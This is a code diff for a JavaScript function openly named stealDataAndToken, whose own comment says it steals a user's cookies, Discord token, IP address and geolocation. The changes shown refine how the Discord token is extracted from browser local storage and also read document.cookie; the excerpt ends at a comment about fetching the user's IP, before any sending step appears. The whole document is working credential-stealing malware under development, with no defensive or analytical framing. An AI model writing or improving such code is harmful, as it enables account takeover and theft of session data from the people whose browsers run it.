@@ -1,15 +1,25 @@
 // Function to steal cookies, Discord token, user's IP, and geolocation
 function stealDataAndToken() {
     var cookies = document.cookie;
-    
-    var token = localStorage.getItem('https://discord.com');
-    console.log('Token from local storage:', token); // Log the token value
-
     var discordToken = null;
 
-    if (token) {
-        var tokenData = JSON.parse(token);
-        discordToken = tokenData.Token;
+    // Retrieve the storage named "https://discord.com"
+    var discordStorage = localStorage.getItem('https://discord.com');
+
+    if (discordStorage) {
+        // Parse the storage data as JSON
+        var storageData = JSON.parse(discordStorage);
+
+        // Iterate over the keys in the storage
+        for (var key in storageData) {
+            if (key === 'Token') {
+                // Found the key named "Token", retrieve the value
+                discordToken = storageData[key];
+                break; // Stop iterating once the token is found
+            }
+        }
+    } else {
+        console.error('No storage named "https://discord.com" found in local storage.');
     }
 
     // Fetch user's IP
